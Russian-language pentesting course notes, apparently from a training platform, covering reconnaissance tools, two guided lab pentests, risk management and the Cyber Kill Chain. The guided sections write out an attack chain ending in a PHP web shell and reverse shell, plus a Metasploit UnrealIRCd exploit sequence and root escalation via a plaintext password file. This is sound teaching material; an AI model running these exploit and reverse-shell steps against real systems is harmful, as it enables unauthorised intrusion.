### Search Skills
Shodan — поисковая система для устройств
- Сканирует интернет в поисках всего, что подключено к сети: роутеры, камеры, серверы, промышленные системы (ICS).
- Позволяет искать по баннерам сервисов, например `apache 2.4.1` — вернёт все серверы с этой версией, разбивку по странам и портам.
- Используется для разведки: найти уязвимую версию → связать с CVE → потенциальная цель.

VirusTotal — онлайн-песочница
- Анализирует файлы, URL, домены и хеши сразу в 70+ антивирусных движках.
- Показывает, детектируется ли файл как вредоносный, а также его поведение.
- Помогает быстро проверить подозрительный файл или ссылку без запуска на своей машине.

CVE и CVSS — каталог уязвимостей
- **CVE (Common Vulnerabilities and Exposures)** — единый реестр известных уязвимостей. Каждая имеет ID вида `CVE-2025-55182`. Некоторые получают имена (Heartbleed, Log4Shell).
- **CVSS (Common Vulnerability Scoring System)** — числовая оценка серьёзности (0–10) на основе:
  - Impact (последствия)
  - Complexity (сложность эксплуатации)
  - Availability (доступность уязвимости)
- Зная CVE, можно найти публичные эксплойты и PoC.

MAN-страницы — документация из терминала
- `man <команда>` откроет руководство по любой команде или утилите Linux.
- Работает для большинства инструментов пентеста (nmap, hydra, sqlmap и т.д.).
- Выход из просмотра — клавиша `q`.

GitHub для пентестера
- Хранилище кода, но ещё и поиск:
  - **PoC (proof-of-concept)** — часто исследователи выкладывают демонстрационные эксплойты по свежим CVE. Искать по `CVE-XXXX-XXXXX poc`.
  - **Конфигурационные файлы** — иногда разработчики случайно коммитят пароли, ключи API, внутренние хосты.
  - **Утилиты и скрипты** — готовые инструменты для автоматизации атак.

## Модуль 2. Основы тестирования на проникновение (Penetration Testing Foundations)
### Управляемое тестирование на проникновение: веб-технологии (Guided Pentest: Web)
Пройденная цепочка атак (Kill Chain)
Полный путь от разведки до получения reverse shell на целевом сервере.
1.  **Разведка и перечисление (Enumeration)**
    - `nmap -sV -sC -p- <IP>` — сканирование всех портов и определение версий сервисов.
    - `gobuster dir` — поиск скрытых директорий и файлов.
    - `curl -I` — анализ HTTP-заголовков.
    - Обнаружен стек: Apache, PHP, MySQL, API-эндпоинты, панель администратора, страница сброса пароля, каталог `/uploads/`.
2.  **Небезопасная прямая ссылка на объект (IDOR)**
    - Параметр `/profile.php?id=` и API-эндпоинт `/api/user?id=` позволили перебрать всех пользователей.
    - Получены имена и email администратора.
3.  **Слабый механизм сброса пароля**
    - Функция сброса пароля раскрывала токен в HTTP-ответе.
    - Сгенерировав токен для email администратора, удалось изменить её пароль.
4.  **Доступ к панели администратора и обход загрузки файлов**
    - Под учётной записью администратора получен доступ к панели.
    - Обнаружена функция загрузки файлов с фильтром по расширениям (чёрный список).
    - **Обход:** фильтр блокировал `.php`, но не учитывал альтернативные расширения типа `.phtml`. Атрибут `accept` на стороне клиента удалён через код элемента — он не является защитой.
5.  **Удалённое выполнение кода (RCE) и обратная оболочка**
    - Загружена веб-оболочка на PHP (`.phtml`), позволяющая выполнять команды на сервере.
    - Через неё запущен reverse shell:
      `nc -lvnp 4444`
    - Получена интерактивная оболочка на целевом сервере.

Ключевые выводы
- **Перечисление — это всё.** Без тщательного картирования приложения ни одна из этих уязвимостей не была бы найдена.
- **Мелкие недостатки = большие компрометации.** IDOR, слабый сброс пароля и обход загрузки по отдельности не критичны. Но в цепочке они привели к полному захвату сервера.
- **Ограничения на клиенте — не безопасность.** Атрибут `accept` и проверки в браузере не имеют значения. Вся фильтрация должна быть на стороне сервера с использованием «белого списка» (allowlist).
- **Механизмы сброса пароля требуют особого внимания.** Раскрытие токенов в ответе — катастрофическая ошибка проектирования.

### Управляемое тестирование на проникновение: инфраструктура (Guided Pentest: Infrastructure)
Методология
1. **Перечисление (Enumeration)** — начать с нуля, выяснить всё о цели.
2. **Анализ уязвимостей** — сопоставить найденные сервисы и версии с известными эксплойтами.
3. **Начальный доступ (Initial Access)** — провести атаку, закрепиться в системе.
4. **Повышение привилегий (Privilege Escalation)** — изнутри системы найти способ получить права root/Administrator.
5. **Отчётность (Reporting)** — задокументировать всё для клиента (в комнате только концептуально).

Практика
Разведка: nmap -sV -sC -oN scan.txt 10.113.173.179
-sV — версии сервисов, -sC — скрипты, -oN — сохранение в файл.
Поиск эксплойтов: searchsploit UnrealIRC — найден уязвимый UnrealIRCd.
Эксплуатация через Metasploit:
msfconsole
search unrealircd
use 0
set RHOSTS 10.113.173.179
set payload cmd/unix/reverse
set LHOST <мой_IP>
set LPORT 4444
exploit
Получена простая оболочка (нет TTY, su и sudo не работают).
Повышение привилегий:
find / -name password* 2>/dev/null — ищем файлы с паролями.
cat /etc/password.txt — пароль root лежит открытым текстом.
ssh root@10.113.173.179 — заходим по SSH с этим паролем, получаем полный контроль.
Выводы
Цепочка: перечисление → эксплойт → повышение — основа пентеста.
Пароли в открытом виде — критическая глупость, встречается часто.
Сохраняй вывод команд (например, -oN) — сэкономит время на отчёте.

### Погрузитесь в мир пентестинга (Dive Into Pentesting)

Области оценки веб-приложений
- Аутентификация: политика паролей, MFA, блокировки, сброс пароля, защита от перебора.
- Авторизация: контроль доступа, защита от горизонтального и вертикального повышения привилегий.
- Управление сессиями: создание, поддержание и завершение сессий, безопасность cookie, защита от CSRF, тайм-ауты.
- Проверка ввода/вывода: защита от инъекций, валидация типов, обработка выходных данных.
- Конфигурация безопасности: заголовки, обработка ошибок, rate limiting, криптография, ненужные сервисы.

Области оценки инфраструктуры
- Сетевая аутентификация: парольная политика, MFA, дефолтные учётные данные, защита SSH/VPN/RDP.
- Авторизация и контроль доступа: доступ к ресурсам строго по ролям и уровню доверия.
- Сегментация сети и доверие: правила файрвола, изоляция, доверительные отношения.
- Управление конфигурациями: устаревшее ПО, небезопасные настройки по умолчанию, слабые протоколы.

Управление рисками
Формула риска: Vulnerability (уязвимость) * Threat (угроза) = Risk (риск).

Пример низкого риска:
- Уязвимость: подробные сообщения об ошибках с внутренними путями.
- Угроза: злоумышленник инициирует ошибки для разведки.
- Риск: ограниченная утечка информации, помогает разведке, но не компрометирует систему.

Пример высокого риска:
- Уязвимость: нарушение контроля доступа (IDOR).
- Угроза: злоумышленник меняет ID в запросе и видит чужие данные.
- Риск: раскрытие или изменение конфиденциальных данных, юридические последствия.

Цикл управления рисками:
1. Идентификация: найти активы, уязвимости и угрозы.
2. Анализ: оценить влияние и вероятность, расставить серьёзность.
3. Снижение: обновления, контроль доступа, мониторинг, перепроектирование.
4. Мониторинг: непрерывно отслеживать, выявлять новое, реагировать.

Правильный настрой пентестера
- Понимание системы: как работает цель, контекст работы функций.
- Внимание к деталям: замечать малые расхождения в поведении.
- Постоянное любопытство: спрашивать "А что, если?".
- Приоритизация: сначала функции с высоким влиянием на бизнес.
- Мышление в контексте: как используются данные, а не только техническая серьёзность.
- Творческое мышление: комбинировать уязвимости для большего эффекта.

Неправильный настрой (избегать)
- Спешка с эксплуатацией без понимания системы.
- Игнорирование бизнес-контекста, фокус только на технических успехах.
- Чрезмерная зависимость от инструментов (ложные срабатывания, пропуск логических багов).
- Предположения без проверки.
- Зацикленность на одной функции, потеря времени и охвата.
- Слепое следование чек-листам, убивает творчество.

Привычки успешного пентестера
- Качественные записи (всё документировать).
- Сбор доказательств (скриншоты, логи).
- Управление временем.
- Проактивная коммуникация с командой и заказчиком.
- Профессионализм, этика, разрешение и доверие — основа всего.

### Киберцепочка убийств (Cyber Kill Chain)

7 этапов атаки (модель Lockheed Martin):
1. Разведка (Reconnaissance) — сбор информации о цели.
2. Вооружение (Weaponization) — создание или модификация полезной нагрузки под найденную уязвимость.
3. Доставка (Delivery) — отправка оружия цели.
4. Эксплуатация (Exploitation) — использование уязвимости.
5. Установка (Installation) — внедрение бэкдора или вредоносного ПО для закрепления.
6. Управление и контроль (C2) — скрытый канал связи со взломанной системой.
7. Действия по целям (Actions on Objectives) — кража данных, нарушение работы, дальнейшее продвижение.

Важно: зная каждый этап, защитники могут разорвать цепочку и остановить атаку.
Кратко о каждом этапе
Разведка
- Пассивная: изучение открытых источников (OSINT), без прямого взаимодействия с целью.
- Активная: взаимодействие с целью (сканирование портов, probing), может оставить следы.

Вооружение
Атакующий готовит эксплойт или вредоносный документ под конкретную уязвимость. Часто объединяется с доставкой.

Доставка
Популярные методы:
- Фишинг-письма (вредоносные вложения или ссылки, имена типа invoice.pdf.exe).
- Целенаправленный фишинг (spear phishing) — подделка отправителя под известное лицу цель.
- Вредоносные ссылки (эксплойт-киты на сайтах, сокращение URL).
- Платформы обмена файлами (Google Drive, Dropbox).
- Вредоносная реклама (malvertising).
- Смишинг (фишинг через SMS).
- Социальная инженерия (убеждение пользователя запустить файл).
- Физическая доставка (USB-флешки, DVD-диски с «приманкой»).

Эксплуатация
Используется уязвимость: баг в ПО, слабый пароль, неправильная конфигурация.

Установка
Злоумышленник закрепляется в системе (persistence): бэкдор, троян, шедулеры задач. Может вернуться позже без повторной эксплуатации.

Управление и контроль (C2)
Создаётся скрытый канал связи с инфраструктурой атакующего. 
Маскировка: частая смена IP, случайные домены, шифрование, обфускация, легитимные облачные сервисы.

Действия по целям
- Эксфильтрация данных (кража информации).
- Нарушение работы сервисов (DDoS, шифрование).
- Продвижение по сети (lateral movement).
